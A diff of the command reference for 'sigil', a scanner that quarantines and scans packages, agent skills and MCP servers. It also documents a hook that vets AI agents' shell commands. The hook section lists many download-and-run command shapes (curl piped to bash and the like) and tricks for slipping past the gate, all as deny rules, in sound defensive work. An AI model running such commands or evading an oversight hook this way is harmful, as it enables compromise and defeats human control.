@@ -17,104 +17,140 @@ Complete reference for every `sigil` command, flag, and exit code.
 
 ### sigil install
 
-Full interactive installation. Copies the binary, creates directories, installs shell aliases, and optionally installs recommended security scanners.
+Copies the running `sigil` binary to an install directory (default `/usr/local/bin`, may require sudo).
 
 ```bash
-sigil install
+sigil install [--path <dir>]
 ```
 
-**What it does:**
-
-1. Copies `sigil` to `/usr/local/bin/` (requires sudo)
-2. Creates `~/.sigil/{quarantine,approved,logs,reports}`
-3. Installs shell aliases in your `.bashrc` or `.zshrc`
-4. Prompts to install optional scanners (semgrep, bandit, trufflehog, safety)
+For shell aliases, Claude Code wiring, and git hooks, use `sigil setup`.
 
 ---
 
-### sigil aliases
+### sigil setup
 
-Install or print shell aliases that wrap common commands with automatic quarantine and scanning.
-
-```bash
-sigil aliases            # Install aliases to shell config
-sigil aliases --print    # Print aliases without installing
-```
-
-**Flags:**
-
-| Flag | Description |
-|------|-------------|
-| `--print` | Print the alias block to stdout without modifying shell config |
-
-**Aliases installed:**
-
-| Alias | Equivalent | Description |
-|-------|-----------|-------------|
-| `gclone <url>` | `sigil clone <url>` | Git clone with quarantine + scan |
-| `safepip <pkg>` | `sigil pip <pkg>` | pip install with scan first |
-| `safenpm <pkg>` | `sigil npm <pkg>` | npm install with scan first |
-| `safefetch <url>` | `sigil fetch <url>` | Download + quarantine + scan |
-| `audit <path>` | `sigil scan <path>` | Scan a directory or file |
-| `audithere` | `sigil scan .` | Scan current directory |
-| `qls` | `sigil list` | Show quarantine status |
-| `qapprove` | `sigil approve <latest>` | Approve most recent quarantined item |
-| `qreject` | `sigil reject <latest>` | Reject most recent quarantined item |
-
-After installation, reload your shell:
+Wire Sigil into AI agent and developer workflows. Every step is best-effort and idempotent — re-running never duplicates configuration.
 
 ```bash
-source ~/.bashrc   # or source ~/.zshrc
+sigil setup claude   # Register the Claude Code plugin marketplace + install sigil-security
+sigil setup shell    # Append gclone/safepip/safenpm aliases to your .bashrc/.zshrc
+sigil setup git      # Install a pre-commit hook running `sigil scan . --fail-on high`
+sigil setup all      # claude + shell, plus git when run inside a repository
 ```
+
+`setup claude` requires the `claude` CLI on PATH and skips with a pointer when it is absent. `setup git` refuses to overwrite a pre-commit hook it didn't write.
+
+---
+
+### sigil hook
+
+Respond to a Claude Code hook event. Reads the hook JSON payload from stdin and prints a `permissionDecision` response. This is the native implementation behind the plugin's PreToolUse enforcement gate — the plugin's `sigil-guard.sh` delegates here when the CLI is on PATH.
+
+```bash
+sigil hook pretooluse    # currently the only supported event
+```
+
+Honors `SIGIL_GUARD_MODE` (`enforce`/`advise`/`off`) and `SIGIL_BYPASS=1`. Always exits 0; unsupported events produce no output so they never block a tool call.
+
+---
+
+### sigil hook: what it intercepts
+
+Beyond package installs and `git clone`, the PreToolUse gate stops agent
+tooling from being acquired, or remote code from running, before the agent
+does it, and every deny names the sigil command to run instead:
+
+| The agent runs | Decision | Reason names |
+|---|---|---|
+| `claude mcp add … -- npx -y pkg` (also `codex mcp add`, `gemini mcp add`, `claude mcp add-json`) | deny | `sigil npm pkg && <original>` |
+| `claude mcp add --transport http name https://…` | ask (deny for tunnel hosts) | |
+| `claude plugin install …`, `claude plugin marketplace add o/r` | deny | `sigil clone https://github.com/o/r && …` |
+| `gemini extensions install` / `link …`, `npx skills add …`, `clawhub install …` | deny | `sigil clone …` / `sigil scan …` |
+| `npx` / `bunx` / `pnpm dlx` / `yarn dlx` / `npm exec` / `uvx` / `uv tool run` / `pipx run` of a registry package | deny | `sigil npm …` / `sigil pip …` |
+| `pipx install …`, `uv tool install …`, `deno run npm:…` / `deno run https://…` | deny | `sigil pip …` / `sigil npm …` / download and scan |
+| `curl … \| sh`, `curl … \| bash -s …`, `curl … \| tee f \| sh`, `curl … 2>&1 \| sh`, `curl … \| env -i bash`, `curl … \| sudo -s`, `bash <(curl …)`, `bash < <(curl …)`, `sh -c "$(curl …)"`, `iwr … \| iex`, also through filters and groups (`curl … \| tr -d '\r' \| bash`, `curl … \| base64 -d \| sh`, `curl … \| (bash)`, `{ curl …; echo; } \| sh`, `curl … \| { echo; bash; }`, `curl … \| while read l; do eval "$l"; done`), into code that reads it (`curl … \| bash -c "$(cat)"`, `curl … \| xargs -0 bash -c`, `curl … \| python3 -c "exec(sys.stdin.read())"`) and into a process substitution (`curl … \| tee >(bash)`) | deny | `sigil scan <url>` |
+| `curl -o i.sh … && bash i.sh` (a download run from disk in the same command), also `sudo -E bash i.sh`, `bash -e i.sh`, `. ./i.sh`, `bash < i.sh`, `cat i.sh \| sh`, `(bash i.sh)`, `eval "$(cat i.sh)"`, `bash <(cat i.sh)`, `trap 'bash i.sh' EXIT`, `flock l bash i.sh`, `xargs -a i.sh -I{} sh -c '{}'`, and a copy of it (`mv i.tmp i.sh && bash i.sh`, `curl … \| dd of=i.sh`) | deny | `sigil scan i.sh && bash i.sh` |
+| downloads, unpacking, copies or clones into `~/.claude/skills`, `.claude/plugins`, `~/.codex/skills`, `~/.gemini/extensions`, `.cursor/rules`, `.mcp.json`, Claude settings, … (also `curl … \| tee ~/.claude/skills/…`, and in any case: `~/.CLAUDE/skills` on macOS) | deny | `sigil scan <src> && <original>` |
+
+The gate reads a command the way the shell runs it: grouping (`( … )`,
+`{ …; }`, `if`), redirections, `VAR=value` words and wrappers (`sudo -u
+root`, `env -i`, `command`, `exec`, `nohup`, `time`, `timeout`, `xargs`,
+`doas`, `busybox`, `flock`, `chroot`, `strace`, `watch`, `runuser`, …) are
+set aside before the command word is judged; `sudo -s`, `sudo -i` and `su`
+start a shell that reads stdin; quoting
+inside a word does not hide it (`"npm" exec x`, `de''no run npm:x`); an
+interpreter's options are read per interpreter (`bash -e i.sh` runs `i.sh`,
+`python3 -X dev i.py` runs `i.py`); the string of `bash -c '…'`, `su -c '…'`
+and `eval '…'` is judged as a command of its own, read whole; a `cd` in a
+subshell, a substitution or a list sent to the background (`cd /tmp &`)
+ends with it, and `cd -`, `pushd`/`popd`, `$HOME` and `$PWD` are followed;
+and a backslash at the end of a line continues the command.
+
+The `sigil … && <original>` form is allowed: the second command only runs if
+the scan of the same target passed. "Same" includes the kind of target: an
+npm package is vetted by `sigil npm`, a PyPI package by `sigil pip`, a
+repository by `sigil clone` (branch included), a local path by `sigil scan`
+— so `sigil scan evil && npm install evil` is still denied. A scan of a
+downloaded file counts only when it runs after the last download to that
+path, the download is not still running in the background (`curl -o i.sh
+… & sigil scan i.sh && …`, until a `wait`), and nothing writes the file
+again after the scan (`sed -i`, `>> i.sh`, `cp x i.sh`). Only the `sigil`
+found on PATH vets anything: `./sigil`,
+`vendor/bin/sigil`, `PATH=… sigil` (or `HOME=…`, any `SIGIL_…=`
+setting such as `SIGIL_POLICY_FILE`, or `LD_PRELOAD=…`), any sigil call in a command that
+defines a `sigil` function or alias, changes PATH, names a Sigil policy
+file (`.sigil.yml` in the working directory is trusted), runs `sigil
+approve` or `sigil known-good`, or writes into `~/.sigil/`, and any after a
+sourced file, vet nothing. A copy of a scanned file made later in the same
+`&&` chain is vetted with it (`sigil scan t && install -m 755 t ~/bin/t &&
+~/bin/t`). Nor does a call that is not a
+real scan (`--help`, `--fail-on critical`, `--severity critical`, a subset
+of `--phases`, `--config`, `--baseline`, also attached or bundled:
+`-pnetwork`, `-s=critical`, `-vh`), or whose exit status `&&` does not
+test: `sigil scan i.sh | tee log && bash i.sh`, `echo $(sigil scan i.sh) &&
+…`, or a sigil call inside quotes or a comment. A sigil call no longer
+allows the rest of a command line — `sigil --version; npm install x`,
+`sigil npm x | npm install x` and `$(sigil --version) npm install x` are
+denied. `npx tsc` is allowed when the
+project has `node_modules/.bin/tsc`. `pip install -r requirements.txt` is
+asked about; a package named beside it (`pip install -r requirements.txt
+evil`) is denied like `pip install evil`.
+
+Register the hook for `Write|Edit|MultiEdit` too (matcher
+`"Bash|Write|Edit|MultiEdit"`, command `sigil hook pretooluse`) and it also
+denies edits that write a download-to-shell or an exfiltrating command into
+agent tooling, and asks before the agent changes its own hooks or MCP
+servers.
+
+Full policy table: [detection/ux.md](detection/ux.md#4-sigil-hook-pretooluse--the-preemptive-gate).
 
 ---
 
 ### sigil config
 
-Show current configuration or initialize the directory structure.
+Read or set values in `~/.sigil/config.json`, and inspect or validate the scan
+policy that applies to a directory.
 
 ```bash
-sigil config             # Show current config and scanner status
-sigil config --init      # Create ~/.sigil directories
+sigil config --list                      # Print ~/.sigil/config.json
+sigil config api_url                     # Print one value
+sigil config api_url https://sigil.local # Set one value
+sigil config --policy                    # Effective scan policy for the current directory
+sigil config --validate .sigil.yml       # Check a project policy without scanning
+sigil config --validate /etc/sigil/policy.yml --org   # Check an organisation policy
 ```
 
 **Flags:**
 
 | Flag | Description |
 |------|-------------|
-| `--init` | Create all required directories under `~/.sigil/` |
+| `--list`, `-l` | Print the whole configuration file |
+| `--policy` | Show which policy files apply (organisation `SIGIL_POLICY_FILE`, project `.sigil.yml`, or `--config FILE`), the merged values, locked keys, and any loosening the organisation policy refused |
+| `--validate FILE` | Validate a policy file. Exit 0 valid, 1 invalid (every problem listed), 2 unreadable |
+| `--org` | With `--validate`: check the file as an organisation policy, which may also set `locked`, `allow_project_policy` and `llm_endpoint` |
 
-**Output includes:**
-
-- Quarantine, approved, logs, and reports directory paths
-- API URL
-- Authentication status
-- Installed external scanners (semgrep, bandit, trufflehog, safety)
-
----
-
-### sigil hooks
-
-Install a pre-commit hook that scans staged files for dangerous patterns before each commit.
-
-```bash
-sigil hooks              # Install in current git repo
-sigil hooks /path/to/repo    # Install in specific repo
-```
-
-**Arguments:**
-
-| Argument | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `git-dir` | No | Current directory | Path to the git repository |
-
-**Patterns checked by the hook:**
-
-- `eval(`, `exec(`, `__import__(`
-- `subprocess` with `shell=True`
-- `os.system`, `pickle.loads`, `child_process`
-
-The hook blocks the commit if any patterns are found. Bypass with `git commit --no-verify` when the pattern is intentional.
+The policy format, precedence and lock rules are in
+[Rolling Sigil out across an organisation](enterprise.md).
 
 ---
 
@@ -215,61 +251,358 @@ sigil npm @langchain/community
 
 ### sigil scan
 
-Scan an existing file or directory for security issues.
+Scan a file, a directory, or a git URL for security issues.
 
 ```bash
-sigil scan <path>
+sigil scan <path-or-url> [--format text|json|sarif|html|markdown|junit] [-o FILE] [--fail-on <severity>] [--fail-on-verdict <level>] [--baseline FILE] [--rules PACK] [--config FILE] [--phases <list>] [--severity <min>]
 ```
 
 **Arguments:**
 
 | Argument | Required | Description |
 |----------|----------|-------------|
-| `path` | Yes | File or directory to scan |
+| `path` | Yes | File or directory to scan. A git URL (`https://…`, `git@…`, anything ending in `.git`) is cloned into quarantine first, exactly like `sigil clone` |
+
+**Options:**
+
+| Option | Default | Description |
+|--------|---------|-------------|
+| `--format`, `-f` | `text` | `text`, `json` (the stable contract, [ADR-0010](adr/ADR-0010-output-contract-sarif-exit-codes.md)), `sarif` (2.1.0), `html` (one self-contained page, no scripts, safe to attach to a ticket), `markdown` (for pull-request comments and CI job summaries) or `junit` (one test case per finding, for CI test-report views). See [Report formats](#report-formats) |
+| `--output`, `-o` | stdout | Write the report to this file |
+| `--fail-on` | `high`, or the policy's `fail_on` | Exit 1 when an active finding at or above this severity is present |
+| `--fail-on-verdict` | | Also exit 1 when the verdict is at or above this level (`low`, `medium`, `high`, `critical`) |
+| `--fail-on-incomplete` | off | Also exit 1 when part of the target could not be fully inspected. Also `SIGIL_FAIL_ON_INCOMPLETE=1`, or `fail_on_incomplete: true` in a policy. See [Incomplete coverage](#incomplete-coverage) |
+| `--baseline` | | Accept the findings recorded in this baseline (see [`sigil baseline`](#sigil-baseline)). They are reported as suppressed and do not fail the scan; new findings still do |
+| `--rules` | | Add a custom rule pack: a JSON or YAML pack, a YARA `.yar`/`.yara` rule file, or a directory of them. Repeatable. Custom packs add rules and can never replace built-ins. See [`sigil rules`](#sigil-rules) and [YARA rules](enterprise.md#yara-rules) |
+| `--yara-engine` | `auto`, or the policy's `yara_engine` | What evaluates YARA rule files: `auto` (the built-in engine, and an installed YARA-X `yr` or YARA `yara` for files that need modules, loops or other YARA it does not evaluate; with neither usable such a file is refused, exit 2), `best-effort` (as `auto`, but with neither usable such a file loads unevaluated and every scan reports incomplete coverage), `builtin` (refuse those files), `yara-x` or `yara` (that engine for every file; it must be installed). Global flag. See [Full YARA: external engines](enterprise.md#full-yara-external-engines) |
+| `--config` | discovered | Use this scan policy instead of discovering `.sigil.yml` in the scan root or current directory |
+| `--no-project-config` | | Ignore `.sigil.yml` (also `SIGIL_NO_PROJECT_CONFIG=1`). The organisation policy still applies |
+| `--phases` | `all` | Comma-separated phase filter |
+| `--severity` | `low` | Minimum severity to report |
+| `--no-cache` | | Force a fresh scan even if the content is unchanged |
+| `--ignore-ledger` | | Report findings even when the content matches a trust-ledger approval |
+| `--follow-refs` | off | Also download what the scanned files tell someone to fetch, install or run, into quarantine, and scan it (never executed). Also enabled by `SIGIL_FOLLOW_REFS=1`. See [Following references](#following-references) |
+| `--llm-review` | off | Send each finding at Medium or above to a language model you choose, for an advisory second opinion. The rule, title, path, masked matched line and surrounding lines are sent; secrets are masked first. Anthropic by default (`ANTHROPIC_API_KEY`), or any OpenAI-compatible endpoint (`SIGIL_LLM_ENDPOINT`). The stage never changes a severity unless the scan policy sets `llm_may_downgrade: true`, and a failure never changes the verdict or exit code. Also `llm_review: true` in the organisation policy or a `--config` file; a `.sigil.yml` found by discovery cannot turn it on. See [LLM review](llm-review.md) |
+| `--no-llm-review` | | Do not run the LLM review stage even if a policy turns it on. Refused when the organisation policy locks `llm_review` |
+| `--llm-model` | `claude-opus-5` for Anthropic | Model for `--llm-review` (also `SIGIL_LLM_MODEL`). Required for an OpenAI-compatible endpoint |
 
 **Behavior:**
 
-1. Verifies the path exists
-2. Copies into quarantine (if not already quarantined)
-3. Runs all 8 scan phases + external scanners
-4. Generates verdict and saves report
+1. Walks the tree honouring `.gitignore` (inside real git repositories only, so an
+   archive cannot hide files from the scanner) and `.sigilignore`. `node_modules/`,
+   `.git/`, `target/`, `.next/`, virtualenvs and caches are never content-scanned.
+   `dist/` and `build/` **are** scanned: in a published package they are the shipped
+   code, and in a git checkout the project's own `.gitignore` already keeps build
+   output out of the walk.
+   Files over 10 MB are not read whole, but they are not skipped either: the first
+   and last 2 MB are scanned (padding a script past a size cap is a known evasion)
+   and findings in the tail carry their real line numbers, prefixed
+   `[tail of oversized file]`.
+2. Runs the eight phases, the decode worklist (decoded payloads reach every phase),
+   the correlation rules, the typosquat check on direct dependencies, and the
+   publish-hygiene checks.
+3. Prints a verdict, a letter grade, a behaviour profile and the key risks. The grade
+   is a label over the verdict, not a second score: **A** no findings, **B**
+   low-severity only, **C** MEDIUM RISK, **D** HIGH RISK, **F** CRITICAL RISK.
+4. Labels what it scanned (`summary.platform` in JSON, `Platform:` in text): `npm`,
+   `pypi`, `agent-skill`, `mcp-server`, `claude-plugin`, `vscode-extension`,
+   `agent-instructions`, `cargo`, `go`, `maven`, `rubygems` or `generic`, judged from
+   the shallowest manifest in the tree. A monorepo reports its root manifest.
+5. When a lifecycle script (`postinstall`, `prepare`, …) or `setup.py` runs a local
+   file that has findings, the manifest gets one extra finding, `INSTALL-REF-001`,
+   one level above the worst finding in that file. The file's own findings are left
+   as they are.
 
 **Example:**
 
 ```bash
-sigil scan .                           # Scan current directory
-sigil scan ./vendor/                   # Scan vendor directory
-sigil scan ./downloaded-mcp-server/    # Scan a specific directory
+sigil scan .                                    # Scan current directory
+sigil scan ./vendor/                            # Scan vendor directory
+sigil scan https://github.com/someone/mcp-tool  # Clone into quarantine, then scan
+sigil scan ./skill --format html > report.html  # Shareable report
+sigil scan ./pkg --format json | jq .summary    # verdict, score, grade, platform
+sigil scan ./pkg --format sarif > sigil.sarif   # GitHub Code Scanning upload
+sigil scan ./skill --follow-refs                # Also scan the installer it tells you to run
+sigil scan . --format markdown -o sigil.md      # Pull-request comment / job summary
+sigil scan . --format junit -o sigil-junit.xml  # CI test-report view
+sigil scan . --baseline .sigil-baseline.json    # Fail only on findings added since the baseline
+sigil scan . --rules ./acme-rules.yaml          # Add your organisation's rules
+sigil scan ./vendor --fail-on-incomplete        # Fail closed if anything could not be inspected
+sigil scan ./skill --llm-review                 # Advisory second opinion from a model (sends masked excerpts)
 ```
+
+#### Incomplete coverage
+
+Sigil does not pass over content silently. Each of these leaves a finding, and
+`--fail-on-incomplete` turns any of them into exit 1:
+
+| Rule | What was not fully inspected |
+|------|------------------------------|
+| `PROV-INCOMPLETE-001` (Low) | A file that could not be read, a directory that could not be listed, a text file over 10 MB of which only the first and last 2 MB were scanned, a file over 512 MB that was not content-scanned, or an agent instruction or markdown file whose bytes are not decodable text |
+| `PROV-BUDGET-001` (Medium) | A file whose analysis ran out of its time budget (see [Per-file scan budget](#per-file-scan-budget)) |
+| `ARTIFACT-008` | An archive that could not be opened or walked fully |
+| `ARTIFACT-009` | An encrypted archive, whose members could not be read |
+| `REF-002` (Low) | A reference `--follow-refs` could not fetch |
+
+Binary files are not on the list: the content phases skip them by design, and
+the structural checks inspect executables, archives and bytecode instead.
+A severity floor (`--severity`, `min_severity`) never hides a coverage finding.
+Only active findings count, so a coverage finding suppressed with a written
+reason (inline marker, `.sigilignore`, baseline, `disable_rules`) does not fail
+the gate. An organisation that locks `fail_on_incomplete` should also lock
+`disable_rules` so a project cannot suppress the coverage rules.
+
+#### Scanning an MCP server from the MCP registry
+
+```bash
+sigil scan mcp:io.github.owner/server-name          # latest version
+sigil scan mcp:io.github.owner/server-name@1.4.0    # a pinned version
+```
+
+Sigil looks the server up in the official MCP registry
+(`registry.modelcontextprotocol.io`). Set `SIGIL_MCP_REGISTRY_URL` to use a
+private sub-registry that implements the same `/v0/servers` API. Sigil then
+fetches the exact code the entry publishes into quarantine and scans it:
+
+1. an npm package: the tarball of the pinned `identifier@version` from
+   registry.npmjs.org;
+2. a PyPI package: that version's sdist, or its first wheel if there is no sdist;
+3. an `.mcpb` bundle served over https;
+4. otherwise, the GitHub source repository at its default branch, limited to
+   the entry's `subfolder` if it names one.
+
+Before the scan, it prints the transport, the secrets the server asks for
+(environment variables marked `isSecret`) and any remote endpoints.
+
+An npm package whose `registryBaseUrl` is not the public registry is not
+followed, because that URL comes from the registry entry and is untrusted
+input; Sigil falls back to the repository. A remote-only server has no code
+to scan, and Sigil exits 2 saying so rather than reporting a clean verdict.
+
+#### Following references
+
+A skill does not have to ship its payload. It can ship a clean `SKILL.md` that
+says a helper "must be installed before using this skill", with a download
+link, or a `curl … | bash` one-liner. With `--follow-refs`, Sigil downloads
+those references into a fresh directory under the quarantine root and runs the
+same phases over them. Nothing it downloads is executed.
+
+- **What counts as a reference.** A URL qualifies when its path names something
+  runnable or unpackable (`.sh`, `.ps1`, `.py`, `.exe`, `.zip`, `.tar.gz`, a GitHub
+  `releases/download/` asset, and similar), when it is on a raw-content or
+  short-link host (`raw.githubusercontent.com`, `gist`, `pastebin`, `bit.ly`, and
+  similar), or when its line tells the reader to acquire it. Acquisition means
+  piping into an interpreter, saving with `curl -o`, or the words download,
+  install or prerequisite. These are not references: plain API calls
+  (`curl https://api…/v4/zones`), documentation and package-index pages,
+  repository home pages (use `sigil clone`), and placeholder hosts
+  (`example.com`, `*.test`, templated `$HOST`).
+- **Never contacted.** A URL on a line that *sends* data (`-X POST`, `-d`,
+  `--upload-file`, `.post(`, webhooks) is an exfiltration or API target. The
+  phases report it; Sigil never contacts it.
+- **Two hops, landing pages only.** When a reference returns an HTML page,
+  Sigil follows the download links on that page (installers, archives)
+  one more hop. URLs inside a fetched *script* are that script's own network
+  targets and are never followed.
+- **Bounds.** Only `http(s)` URLs are fetched. A host must resolve to a public
+  address: loopback, RFC 1918, link-local, CGNAT and cloud-metadata addresses
+  are refused. The host is read with the same URL parser the HTTP client
+  connects with. Redirects are followed one hop at a time (at most 5): each
+  hop's host is checked the same way and that hop's connection is pinned to the
+  address that was checked, so a second DNS answer cannot swap in an internal
+  address. The limits are at most 20 fetches per scan, 10 MiB per response and
+  15 seconds per request, redirects included. Fetched archives are unpacked
+  with the same bounded extractor the package workflows use.
+
+Findings in fetched content keep their rule ids. They are attributed to the URL,
+with a `ref://<url>|file://<path>` locator and a snippet naming the file and line
+that referenced it. Two rules are specific to this mode:
+
+| Rule | Severity | Meaning |
+|------|----------|---------|
+| `REF-001` | High | A referenced download is a native executable (ELF, PE, Mach-O) that static analysis cannot vouch for |
+| `REF-002` | Low | A referenced artifact could not be fetched (taken down, 404, refused), so it was not scanned. A clean verdict does not cover it |
+
+A result that includes followed references is never cached, because the remote
+content can change between runs.
 
 ---
 
-### sigil fetch
+### sigil scan: archives, URLs and GitHub links
 
-Download a file or archive from a URL, extract if applicable, quarantine, and scan.
+Besides a directory, a file or a git URL, `sigil scan` takes anything a skill,
+plugin or package is usually handed around as. Each is materialised into a new
+quarantine entry first, then scanned with the flags you gave:
 
 ```bash
-sigil fetch <url>
+sigil scan ./pdf.skill                                  # .skill / .zip / .tar.gz / .tgz / .tar / .whl / .vsix / .gz
+sigil scan https://example.com/releases/tool.tar.gz     # archive URL: downloaded, unpacked, scanned
+sigil scan https://raw.githubusercontent.com/o/r/main/skills/x/SKILL.md
+sigil scan https://github.com/o/r/blob/main/SKILL.md    # /blob/ pages are rewritten to the raw file
+sigil scan https://github.com/anthropics/skills/tree/main/skills/pdf   # clone, scan only that directory
 ```
 
-**Arguments:**
+- Archives are recognised by their leading bytes, so a renamed archive is
+  still unpacked. Unsafe archives are **refused, not partly scanned** (exit
+  `2`): path traversal, absolute or drive-letter names, symlinks, hard links,
+  device entries, duplicate members, encrypted members, more than 20,000
+  entries or more than 1 GiB unpacked. The quarantine entry is recorded as
+  rejected with the reason.
+- Downloads are `https`/`http` only, capped at 256 MiB and 5 redirects, and
+  never downgrade `https` to `http`. Loopback, link-local (cloud metadata),
+  private and other non-public addresses are refused unless
+  `SIGIL_ALLOW_PRIVATE_URLS=1` is set (internal mirrors).
+- The quarantine id is printed (`sigil approve <id>` / `sigil reject <id>`).
+- Repository URLs (`https://github.com/o/r`, `git@…`, `….git`) keep the
+  `sigil clone` behaviour. An extension-less URL on any other host
+  (`https://get.example.com`) is probed with `git ls-remote`: a repository is
+  cloned, anything else is downloaded as a file, and an HTML page is refused.
 
-| Argument | Required | Description |
-|----------|----------|-------------|
-| `url` | Yes | URL to download from |
+`sigil fetch` is unrelated: it refreshes threat signatures. Use `sigil scan
+<url>` to download and scan.
 
-**Behavior:**
+Details, limits and the comparison with SkillSpector's input handling:
+[detection/ux.md](detection/ux.md).
 
-1. Downloads the file to quarantine
-2. Detects archive type (`.tar.gz`, `.tgz`, `.zip`, `.tar.bz2`)
-3. Extracts archives automatically
-4. Runs full scan on extracted contents
+### sigil scan: trees with several skills
+
+When the scanned tree contains two or more skills (directories holding a
+`SKILL.md`, at any depth), the text report adds a **Skills** table — verdict,
+score, findings and files per skill, worst first — and `--format json` adds a
+`skills` array:
+
+```json
+"skills": [
+  {"path": "skills/pdf", "name": "pdf", "verdict": "LOW RISK", "grade": "A",
+   "score": 0, "findings_count": 0, "files": 12, "max_severity": null, "rules": []}
+]
+```
+
+Each skill is scored as a standalone `sigil scan <skill>` would score the same
+findings. The overall verdict, score and exit code are not affected.
+
+---
+
+### sigil baseline
+
+Record the current findings as accepted, so later scans fail only on new ones.
+Use it to adopt Sigil on an existing codebase without first clearing every
+historical finding.
+
+```bash
+sigil baseline . --reason "accepted at adoption, tracked in SEC-123"
+sigil scan . --baseline .sigil-baseline.json
+```
+
+| Argument / flag | Description |
+|------|-------------|
+| `path` | Directory or file to scan |
+| `--reason` | Why these findings are accepted. Recorded in the baseline |
+| `-o FILE` | Write the baseline here instead of `.sigil-baseline.json` in the scanned directory. A `.yaml`/`.yml` name writes YAML |
+| `--no-project-config` | Ignore `.sigil.yml` |
+
+A finding is matched by rule, file and the content of the matched line, not
+its line number, so inserting code above an accepted finding does not re-open
+it, while a second copy of the same risky line is a new finding. Entries that
+stop matching are reported as stale. The file stores hashes, not snippets.
+Exit 0 when the baseline is written, 2 when the scan or the write failed.
+
+### sigil rules
+
+List, inspect, validate, test and sign detection rules, including custom packs
+passed with `--rules`.
+
+```bash
+sigil rules list                          # Every active rule
+sigil rules list --phase network_exfil    # One phase
+sigil rules show CODE-001                 # Pattern, filters, suppressions, remediation, policy effect
+sigil rules validate ./acme-rules.yaml    # Exit 0 valid, 1 invalid, 2 unreadable
+sigil rules test ./acme-rules.yaml ./fixtures   # Run only this pack and print what fires
+sigil rules sign ./acme-rules.yaml --key signing.pem -o acme-rules.signed.json
+sigil rules validate ./acme.yar           # A YARA rule file: every problem with file:line
+sigil rules sign ./acme.yar --key signing.pem -o acme.yar.sig   # Detached signature
+```
+
+A pack can be JSON or YAML, in the full schema or the compact form, or a YARA
+rule file (`.yar`, `.yara`), whose rules become `YARA-<NAME>` and are matched
+against each file's raw bytes. A full-schema rule can also exempt individual
+matches rather than whole lines: `suppress.value_matches` (regexes the rule's
+`(?P<value>...)` group must match in full) and `suppress.match_context` (regexes
+for the text just before and after the rule's `(?P<anchor>...)` group, optionally
+per file extension, with `same` to require two named groups to capture the same
+text). A line is dropped only when every match on it is exempt;
+`sigil rules validate` refuses a `value_matches` without a `value` group and a
+`same` naming a group that does not exist. Details in
+[schemas.md](schemas.md#match-local-suppression-full-schema). When `SIGIL_PACK_PUBLIC_KEY` is set, every
+custom pack must carry a valid signature from that key — for a YARA file, a
+detached `<file>.sig` beside it; an unsigned or badly signed pack stops the
+scan with exit 2 rather than being skipped. See
+[Custom rule packs and signing](enterprise.md#custom-rule-packs-and-signing)
+and [YARA rules](enterprise.md#yara-rules).
+
+For a YARA file, `validate` names the engine that will evaluate it
+(`built-in`, `YARA-X 1.20.0`, `YARA 4.5.0`, …) and, for an external engine,
+compiles it with that engine; a file that needs an engine the machine does
+not have is reported as not checked (exit 1). `validate`, `test`, `sign`,
+`list` and `show` use the engine a scan run from the same directory would:
+`--yara-engine`, or the organisation policy's and the project file's
+`yara_engine`, a locked value included (a refused flag is reported on
+stderr). `show` prints it. When the engine refuses files, each refused file
+is one problem, with the engine's message quoted under it.
+
+### sigil diff
+
+Run a fresh scan and compare it with an earlier JSON scan result.
+
+```bash
+sigil scan . --format json -o before.json
+# ... change the code ...
+sigil diff --baseline before.json .
+```
+
+Exit 0 when there are no new findings, 1 when there are new findings, 2 when the
+baseline or the path cannot be read. (Before this release, new findings gave 2.)
+
+### Report formats
+
+`--format` and `-o` are global flags, so every command that renders a report
+takes them.
+
+| Format | Use it for |
+|--------|-----------|
+| `text` | Terminals |
+| `json` | Machines. The stable output contract ([ADR-0010](adr/ADR-0010-output-contract-sarif-exit-codes.md)) |
+| `sarif` | GitHub Code Scanning and other SARIF 2.1.0 consumers |
+| `html` | One self-contained page with no scripts, safe to attach to a ticket |
+| `markdown` (`md`) | Pull-request comments and CI job summaries: verdict and findings table |
+| `junit` | CI test-report views (GitLab, Jenkins, Azure DevOps): one test case per finding, failed when the finding is at or above `--fail-on` |
+
+`sigil skills scan` supports `text`, `json` and `markdown`. It exits 2 for any
+other format rather than silently printing text.
+
+### sigil fetch
+
+Refresh the cached threat signatures from Sigil cloud (`~/.sigil/signatures.json`).
+It does not download or scan code: to scan something at a URL, pass the URL to
+`sigil scan` (git repositories, archives, single files and GitHub `/tree/` links
+are fetched into quarantine first).
+
+```bash
+sigil fetch            # refresh when the cache is stale
+sigil fetch --force    # re-download even if fresh
+```
+
+**Options:**
+
+| Option | Description |
+|--------|-------------|
+| `-f`, `--force` | Re-download even if the cached signatures are fresh |
 
 **Example:**
 
 ```bash
-sigil fetch https://example.com/agent-tool.tar.gz
-sigil fetch https://github.com/user/repo/archive/main.zip
+sigil fetch --force
+sigil scan https://example.com/agent-tool.tar.gz        # scan a URL (see sigil scan)
 ```
 
 ---
@@ -296,10 +629,10 @@ sigil list
 
 ### sigil approve
 
-Move a quarantined item to the approved directory after review.
+Mark a quarantined item as trusted after review.
 
 ```bash
-sigil approve <quarantine-id>
+sigil approve <quarantine-id> [--reason "why"]
 ```
 
 **Arguments:**
@@ -307,16 +640,13 @@ sigil approve <quarantine-id>
 | Argument | Required | Description |
 |----------|----------|-------------|
 | `quarantine-id` | Yes | ID shown in `sigil list` output |
-
-**Security:**
-
-- Validates the quarantine ID format (alphanumeric and underscores only)
-- Uses `realpath` to prevent path traversal attacks
-- Verifies the source path is within the quarantine directory
+| `--reason` | No | Reason for approval, recorded in the trust ledger |
 
 **Behavior:**
 
-Moves the item from `~/.sigil/quarantine/<id>/` to `~/.sigil/approved/<id>/`.
+Marks the entry as approved and pins its content digest in the trust ledger, so
+digest-matching content is allowlisted on future scans. The files themselves stay
+at `~/.sigil/quarantine/<id>/` — copy them into your project yourself once approved.
 
 ---
 
@@ -344,6 +674,138 @@ Permanently removes the item from `~/.sigil/quarantine/<id>/`. This cannot be un
 
 ---
 
+## Host Residue
+
+`sigil scan` judges code *before* it runs. `sigil residue` looks at this machine
+*after* something ran: the crontab entry an uninstalled skill left behind, the line a
+setup script appended to `~/.zshrc`, the git hook that still fires on every commit, the
+credential file an agent wrote world-readable, the cache directory of a tool that is no
+longer installed, the `/etc/hosts` line that redirects an API host.
+
+### sigil residue scan
+
+```bash
+sigil residue scan [--repo <path>] [--fail-on info|low|medium|high|critical]
+sigil --format json residue scan
+```
+
+Read-only. Nine checks: shell startup files (`RES-SHELL-*`), persistence entries
+(`RES-PERSIST-*`: crontab and `/etc/cron*`, launchd on macOS, systemd on Linux, autostart
+entries, `sudoers.d`), git hooks in the repo, the hook templates and `core.hooksPath`
+(`RES-HOOK-*`), credential file permissions (`RES-CRED-*`), leftover tool directories
